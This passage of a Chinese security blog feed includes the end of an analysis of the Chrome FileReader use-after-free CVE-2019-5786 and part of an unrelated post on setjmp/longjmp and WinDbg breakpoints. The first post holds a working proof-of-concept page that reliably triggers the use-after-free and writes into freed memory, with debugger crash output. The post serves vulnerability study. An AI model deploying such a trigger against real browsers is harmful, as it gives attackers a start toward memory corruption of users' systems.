class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// worker.js 的代码</span></span><br><span class="line">onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ab = message.data;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Worker thread: received: '</span> + ab);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Wroker thread: ArrayBuffer.byteLength is : '</span> + ab.byteLength);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Main thread: before postMessage, ab.byteLength is 4096</span><br><span class="line">Main thread: after postMessage, ab.byteLength is 0</span><br><span class="line">Worker thread: received: [object ArrayBuffer]</span><br><span class="line">Wroker thread: ArrayBuffer.byteLength is : 4096</span><br></pre></td></tr></table></figure><p>McAfee Labs 的文章提到，使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/BaseAudioContext/decodeAudioData" target="_blank" rel="noopener">AudioContext.decodeAudioData</a> 同样可以实现 ArrayBuffer 的 <a href="https://programlife.net/tags/Neuter/">Neuter</a> 。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> context = <span class="keyword">new</span> AudioContext();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Before decodeAudioData, ab.byteLength is '</span> + ab.byteLength);</span><br><span class="line">context.decodeAudioData(ab, </span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'decode succeed: '</span> + buffer);</span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'decode failed: '</span> + e);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'After decodeAudioData, ab.byteLength is '</span> + ab.byteLength);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>由测试结果可知，不管解码成功与否，ArrayBuffer 都会被转移：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before decodeAudioData, ab.byteLength is 4096</span><br><span class="line">After decodeAudioData, ab.byteLength is 0</span><br><span class="line">decode failed: EncodingError: Unable to decode audio data</span><br></pre></td></tr></table></figure><h4 id="2-3-2-POC-构造"><a href="#2-3-2-POC-构造" class="headerlink" title="2.3.2 POC 构造"></a>2.3.2 POC 构造</h4><p>分析清楚了漏洞的底层原理，写 POC 就是很简单的事情了，笔者构造的 POC 代码如下所示。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- poc.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> ab1, ab2;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> byteLength = <span class="number">100</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">onProgress</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (ab1.byteLength != byteLength) &#123;</span></span><br><span class="line"><span class="undefined">        ab1 = event.target.result;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">onLoadEnd</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">    ab2 = event.target.result;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (ab1 != ab2 &amp;&amp; ab1.byteLength == ab2.byteLength) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> flag = <span class="number">0x61616161</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">new</span> <span class="built_in">DataView</span>(ab1).setUint32(<span class="number">0</span>, flag, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">DataView</span>(ab2).getUint32(<span class="number">0</span>, <span class="literal">true</span>) == flag) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'verify succeed! try crash self...'</span>);</span></span><br><span class="line"><span class="undefined">            crash();</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'verify failed, retry now...'</span>);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'failed this time, retry now...'</span>);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.setTimeout(init, <span class="number">1000</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    ab1 = ab2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> string = <span class="string">'A'</span>.repeat(byteLength);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([string]);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();</span></span><br><span class="line"><span class="undefined">    reader.onprogress = onProgress;</span></span><br><span class="line"><span class="undefined">    reader.onloadend = onLoadEnd;</span></span><br><span class="line"><span class="undefined">    reader.readAsArrayBuffer(blob);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">crash</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">'worker.js'</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="undefined">        worker.postMessage(ab1, [ab1, ab2]);</span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> errmsg = <span class="string">'ArrayBuffer at index 1 could not be transferred'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (e.message.indexOf(errmsg) != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab2);</span></span><br><span class="line"><span class="javascript">            dv.setUint32(<span class="number">4</span>, <span class="number">0x42424242</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.setTimeout(init, <span class="number">1000</span>);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">init();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// worker.js</span></span><br><span class="line">onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里向工作者线程 <code>postMessage</code> 的小技巧参考了 Exodus Intelligence 的代码。注意 <code>postMessage</code> 本身也是异步执行的，也就是调用之后会立刻返回，如果是下面这样的写法，可能无法触发 Crash ，因为主线程中 ArrayBuffer 的 <strong>backing store</strong> 可能还没有被释放。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">worker.postMessage(ab1, [ab1]);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab2);</span><br><span class="line">dv.setUint32(<span class="number">4</span>, <span class="number">0x42424242</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>而如果采用 <code>worker.postMessage(ab1, [ab1, ab2])</code> 这样的写法，当 <code>ab1</code> 传送完毕之后传送 <code>ab2</code> 时会抛出一个异常，此时主线程中 ArrayBuffer 的 <strong>backing store</strong> 已经被释放，可以非常稳定的触发 UAF 操作。</p><blockquote><p>Uncaught DOMException: Failed to execute ‘postMessage’ on ‘Worker’: ArrayBuffer at index 1 could not be transferred.</p></blockquote><p>查看 Chrome Stable 版本的发布历史，可以知道 <code>72.0.3626.121</code> 的上一个版本号为 <code>72.0.3626.119</code> ，因此可以下载该版本的 <a href="https://programlife.net/tags/Chrome/">Chrome</a> 进行测试。测试时注意屏蔽 Internet 访问，否则可能会自动升级。测试上面的 POC 代码可以发现，漏洞的触发非常稳定。</p><p><img src="/uploads/201903/cve-2019-5786-chrome-filereader-uaf-vulnerability.png" alt="CVE-2019-5786 Chrome FileReader ArrayBuffer UAF"></p><p>如果将 <a href="https://programlife.net/tags/WinDbg/">WinDbg</a> 附加到 Chrome 的网页渲染进程（可以打开 Chrome 的任务管理器来查看进程 PID ），可以捕获到相关的异常信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(74c.2a4): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00000004 ebx=02b30ec8 ecx=00000042 edx=00000042 esi=00000042 edi=2b404000</span><br><span class="line">eip=5f625606 esp=0021ecc0 ebp=0021ece8 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202</span><br><span class="line">chrome_child!ovly_debug_event+0x10c1fa6:</span><br><span class="line">5f625606 881407          mov     byte ptr [edi+eax],dl      ds:0023:2b404004=??</span><br><span class="line"></span><br><span class="line">0:000&gt; r edi</span><br><span class="line">edi=2b404000</span><br><span class="line"></span><br><span class="line">0:000&gt; r eax</span><br><span class="line">eax=00000004</span><br><span class="line"></span><br><span class="line">0:000&gt; r dl</span><br><span class="line">dl=42</span><br></pre></td></tr></table></figure><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03. 小结"></a>0x03. 小结</h2><p>这次 <a href="https://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a> 尽管花费了一定的休息时间，但是作为第一个浏览器漏洞，在分析的过程中还是学到了不少东西，希望下次有时间可以学习一下这个漏洞的 Exploit 的编写。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-漏洞简介&quot;&gt;&lt;a href=&quot;#0x01-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01. 漏洞简介&quot;&gt;&lt;/a&gt;0x01. 漏洞简介&lt;/h2&gt;&lt;p&gt;准备用业余时间学习一点浏览器漏洞利用相关的知识，刚好最近 Chrome 爆出来一个野外利用漏洞 CVE-2019-5786 ，而且网上也有两篇比较详细的分析报告（来自 &lt;a href=&quot;https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Exodus Intelligence&lt;/a&gt; 和 &lt;a href=&quot;https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/analysis-of-a-chrome-zero-day-cve-2019-5786/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;McAfee Labs&lt;/a&gt;），刚好可以借鉴学习一下漏洞的原理以及利用技巧。&lt;/p&gt;
&lt;p&gt;Chrome 72.0.3626.121 的 &lt;a href=&quot;https://chromereleases.googleblog.com/2019/03/stable-channel-update-for-desktop.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;安全公告&lt;/a&gt; 显示，漏洞 CVE-2019-5786 由 Google Threat Analysis Group 的 Clement Lecigne 发现其被利用于野外攻击（配合 Windows 内核空指针漏洞 CVE-2019-0808 可实现 Windows 7 下的提权操作）。&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Chrome" scheme="http://programlife.net/categories/Vulnerability/Chrome/"/>
    
    
      <category term="CVE-2019-5786" scheme="http://programlife.net/tags/CVE-2019-5786/"/>
    
      <category term="Chrome" scheme="http://programlife.net/tags/Chrome/"/>
    
      <category term="FileReader" scheme="http://programlife.net/tags/FileReader/"/>
    
      <category term="Use-After-Free" scheme="http://programlife.net/tags/Use-After-Free/"/>
    
      <category term="漏洞分析" scheme="http://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Neuter" scheme="http://programlife.net/tags/Neuter/"/>
    
  </entry>
  
  <entry>
    <title>为什么我的 WinDbg 内存断点失效了？</title>
    <link href="http://programlife.net/2019/03/11/why-my-windbg-data-breakpoint-did-not-work-as-expected/"/>
    <id>http://programlife.net/2019/03/11/why-my-windbg-data-breakpoint-did-not-work-as-expected/</id>
    <published>2019-03-11T21:31:00.000Z</published>
    <updated>2019-03-11T17:14:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-问题描述"><a href="#0x01-问题描述" class="headerlink" title="0x01. 问题描述"></a>0x01. 问题描述</h2><p>周末在测试一个程序时，发现其莫名其妙的 Crash 在了一个系统自带 DLL 的某个函数里面，而且很难直观地看出来 Crash 的原因，分析之后发现是不当使用 C 语言 <code>setjmp</code> 和 <code>longjmp</code> 两个函数导致的。那么这和文章标题有什么联系呢？笔者在分析的过程中使用了 WinDbg 的内存断点（ Processor Breakpoint / Data Breakpoint ）来跟踪一个栈变量的读写操作，理论上这个断点会多次命中，但实际上只命中了一次，而这个现象正是由于不当使用 <code>setjmp</code> 和 <code>longjmp</code> 导致 <code>esp</code> 和 <code>ebp</code> 寄存器的值的非预期改变所导致的。</p><a id="more"></a><h2 id="0x02-setjmp-longjmp"><a href="#0x02-setjmp-longjmp" class="headerlink" title="0x02. setjmp / longjmp"></a>0x02. setjmp / longjmp</h2><p>在分析具体的问题之前，先简单了解一下 C 语言中这两个不太常见的函数 <code>setjmp</code> 和 <code>longjmp</code> 。</p><p>在 C 语言中，可以使用 <code>goto</code> 语句来实现函数内部的任意跳转，而 <code>setjmp</code> 和 <code>longjmp</code> 则可以实现函数间的任意跳转，和 <code>goto</code> 语句一样，配合使用 <code>setjmp</code> 和 <code>longjmp</code> 可以实现简单的异常处理。这两个函数的声明位于头文件 <code>setjmp.h</code> 中，声明如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">setjmp</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    _Out_ jmp_buf _Buf</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line">__declspec(noreturn) <span class="keyword">void</span> __<span class="function">cdecl <span class="title">longjmp</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ jmp_buf _Buf,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ <span class="keyword">int</span>     _Value</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>函数 <code>setjmp</code> 接收类型为 <code>jmp_buf</code> 的参数 <code>_Buf</code> （通常命名为 <code>env</code> ），这里 <code>jmp_buf</code> 是通过 <code>typedef</code> 定义的一个别名，表示元素个数为 <code>16</code> 的 <code>int</code> 数组（和定义函数指针时一样，这里 <code>typedef</code> 的写法很不直观）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _JBLEN  16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _JBTYPE int</span></span><br><span class="line"><span class="keyword">typedef</span> _JBTYPE jmp_buf[_JBLEN];</span><br></pre></td></tr></table></figure><p>调用 <code>setjmp</code> 函数可以保存 <code>setjmp</code> 返回时的一些上下文信息（前面提到参数通常命名为 <code>env</code> 会显得更加直观），类似 <code>GetThreadContext</code> 保存线程的上下文信息一样，只不过 <code>setjmp</code> 保存的信息更少。直接调用 <code>setjmp</code> 时其返回值总是为 <code>0</code> 。</p><p>函数 <code>longjmp</code> 则跳转回调用 <code>setjmp</code> 的地方，并将 <code>setjmp</code> 的返回值设置为 <code>longjmp</code> 第二个参数所指定的值，这样调用完 <code>setjmp</code> 之后可以通过返回值判断跳转来自哪里。</p><p>下面通过一个简单的例子来说明 <code>setjmp</code> 和 <code>longjmp</code> 的用法：编译以下代码，不难理解程序的输出为 <code>1337</code> 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOINLINE __declspec(noinline)</span></span><br><span class="line"></span><br><span class="line"><span class="function">NOINLINE <span class="keyword">void</span> <span class="title">bar</span><span class="params">(jmp_buf* env)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    longjmp(*env, <span class="number">1337</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this line will never be printed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NOINLINE <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    jmp_buf env;</span><br><span class="line">    <span class="keyword">int</span> result = setjmp(env);</span><br><span class="line">    <span class="comment">// __asm int 3;</span></span><br><span class="line">    <span class="keyword">if</span> (result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"result = %d\n"</span>, result);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bar(&amp;env);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    foo();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里暂时不深究 <code>setjmp</code> 的底层实现细节，只需要知道 <code>jmp_buf</code> 中有一个元素保存了 <code>setjmp</code> 返回之后的 <code>eip</code> 即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(2a54.3334): Break instruction exception - code 80000003 (!!! second chance !!!)</span><br><span class="line">eax=00000000 ebx=00fb8000 ecx=00000000 edx=010ffb6c esi=002a9df0 edi=0131d650</span><br><span class="line">eip=0029106e esp=010ffb6c ebp=010ffbb0 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206</span><br><span class="line">Test!foo+0x1e:</span><br><span class="line">0029106e cc              int     3</span><br><span class="line"></span><br><span class="line">0:000&gt; ub eip</span><br><span class="line">Test!foo+0x6 [c:\users\test\source\repos\test\test\test.cpp @ 13]:</span><br><span class="line">00291056 a104902a00      mov     eax,dword ptr [Test!__security_cookie (002a9004)]</span><br><span class="line">0029105b 33c5            xor     eax,ebp</span><br><span class="line">0029105d 8945fc          mov     dword ptr [ebp-4],eax</span><br><span class="line">00291060 8d45bc          lea     eax,[ebp-44h]</span><br><span class="line">00291063 6a00            push    0</span><br><span class="line">00291065 50              push    eax</span><br><span class="line">00291066 e875090100      call    Test!__setjmp3 (002a19e0)</span><br><span class="line">0029106b 83c408          add     esp,8          ; eip after setjmp&apos;s return</span><br><span class="line"></span><br><span class="line">0:000&gt; dd ebp-44 L10</span><br><span class="line">010ffb6c  010ffbb0 00fb8000 0131d650 002a9df0</span><br><span class="line">010ffb7c  010ffb60 0029106b 010ffbec 00000000   ; env[5] = eip</span><br><span class="line">010ffb8c  56433230 00000000 010ffbb8 010ffbb8</span><br><span class="line">010ffb9c  0029117c 00000000 00294fc0 00291300</span><br></pre></td></tr></table></figure><h2 id="0x03-Crash-分析"><a href="#0x03-Crash-分析" class="headerlink" title="0x03. Crash 分析"></a>0x03. Crash 分析</h2><p>介绍完 <code>setjmp</code> 和 <code>longjmp</code> 之后，让我们回到正题。问题模型简化后的代码如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOINLINE __declspec(noinline)</span></span><br><span class="line"></span><br><span class="line"><span class="function">NOINLINE <span class="keyword">void</span> <span class="title">bar</span><span class="params">(jmp_buf* env, <span class="keyword">int</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!value)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> env_eip = ((<span class="keyword">int</span> *)env)[<span class="number">5</span>];</span><br><span class="line">        __asm</span><br><span class="line">        &#123;</span><br><span class="line">            xor eax, eax</span><br><span class="line">            mov ebx, env_eip</span><br><span class="line">            jmp ebx</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    longjmp(*env, <span class="number">1337</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this line will never be printed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NOINLINE <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">0</span>;</span><br><span class="line">    jmp_buf env;</span><br><span class="line">    <span class="keyword">int</span> result = setjmp(env);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"result = %d\n"</span>, result);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bar(&amp;env, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    foo();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行这段代码会造成 Crash ，具体的位置为 <code>ntdll!RtlUnwind+0x3c52f</code> ，此时如果尝试继续运行程序，则会相继 Crash 在多个不同的位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 